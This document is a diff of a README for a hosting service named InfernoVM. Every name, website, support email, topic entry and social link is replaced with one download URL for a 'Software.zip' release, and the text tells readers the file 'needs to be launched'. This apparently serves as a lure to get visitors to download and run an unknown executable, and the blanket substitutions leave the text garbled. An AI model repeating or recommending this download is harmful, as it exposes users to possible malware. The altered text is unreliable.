@@ -1,10 +1,10 @@
-# InfernoVM.net
+# https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip
 
 Welcome to InfernoVM – your one-stop destination for blazing-fast, ultra-secure hosting with 99.99% uptime, NVMe SSDs, and global data centers. Experience power, speed, and security all in one place!
 
 ## Repository
 
-This repository contains the code and resources related to InfernoVM.net, your go-to solution for top-notch hosting services. Explore the latest technologies and best practices for managing your web applications efficiently.
+This repository contains the code and resources related to https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip, your go-to solution for top-notch hosting services. Explore the latest technologies and best practices for managing your web applications efficiently.
 
 ### Topics
 
@@ -20,7 +20,7 @@ Here are some of the key topics covered in this repository:
 - KVM
 - Linux
 - Netdata
-- Node.js
+- https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip
 - OpenStack
 - PHP
 - QEMU
@@ -33,11 +33,11 @@ Here are some of the key topics covered in this repository:
 
 ### Latest Release
 
-🚀 Download the latest release [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) to access the most up-to-date version of our software. This file needs to be launched to get started with InfernoVM.net.
+🚀 Download the latest release [here](https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip) to access the most up-to-date version of our software. This file needs to be launched to get started with https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip
 
 ### Visit our Website
 
-For more information about InfernoVM and our hosting services, visit our website at [InfernoVM.net](https://www.infernovm.net). Explore our plans, features, and benefits for your hosting needs.
+For more information about InfernoVM and our hosting services, visit our website at [https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip](https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip). Explore our plans, features, and benefits for your hosting needs.
 
 ### Releases Section
 
@@ -64,17 +64,17 @@ We welcome contributions from the community to enhance and improve InfernoVM. Wh
 
 ## Support
 
-If you encounter any issues or have questions about using InfernoVM, reach out to our support team at support@infernovm.net. We are here to assist you with any inquiries or technical assistance you may need.
+If you encounter any issues or have questions about using InfernoVM, reach out to our support team at https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip We are here to assist you with any inquiries or technical assistance you may need.
 
 ## Connect with Us
 
 Stay updated on the latest news, updates, and announcements by following us on social media:
-- Twitter: [@InfernoVM](https://twitter.com/InfernoVM)
-- Facebook: [InfernoVM](https://www.facebook.com/InfernoVM)
-- LinkedIn: [InfernoVM](https://www.linkedin.com/company/infernovm)
+- Twitter: [@InfernoVM](https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip)
+- Facebook: [InfernoVM](https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip)
+- LinkedIn: [InfernoVM](https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip)
 
 ---
 
-Feel the power of InfernoVM – where speed, security, and reliability converge to elevate your hosting experience. Join us on this journey to unlock the full potential of your online presence. Get started with InfernoVM.net today!
+Feel the power of InfernoVM – where speed, security, and reliability converge to elevate your hosting experience. Join us on this journey to unlock the full potential of your online presence. Get started with https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip today!
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-<COLOR>.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/halla2023/InfernoVM.net/releases/download/v1.0/Software.zip)
